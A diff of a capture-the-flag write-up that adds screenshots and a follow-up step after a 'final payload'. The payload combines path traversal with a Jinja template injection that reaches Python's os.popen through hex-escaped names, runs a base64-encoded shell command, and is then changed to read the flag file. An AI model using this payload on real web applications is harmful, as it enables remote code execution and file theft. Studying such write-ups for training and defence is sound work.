@@ -119,6 +119,15 @@ our final payload is
 
 ```..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\app\templates\errors\test {{ request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n bHMgL2FwcA== | base64 -d | bash")["read"]() }}```
 
+and we get output like this
+
+<img width="1391" height="281" alt="image" src="https://github.com/user-attachments/assets/48b0c59f-9382-456b-8c7c-4d2038cf3da1" />
+
+and we change command to from "ls /app" to "cat flag-c8f5526c-4122-4578-96de-d7dd27193798.txt"
+
+<img width="1263" height="250" alt="image" src="https://github.com/user-attachments/assets/35e82cc8-d243-49ba-983f-d171224f28ea" />
+
+
 
 
 
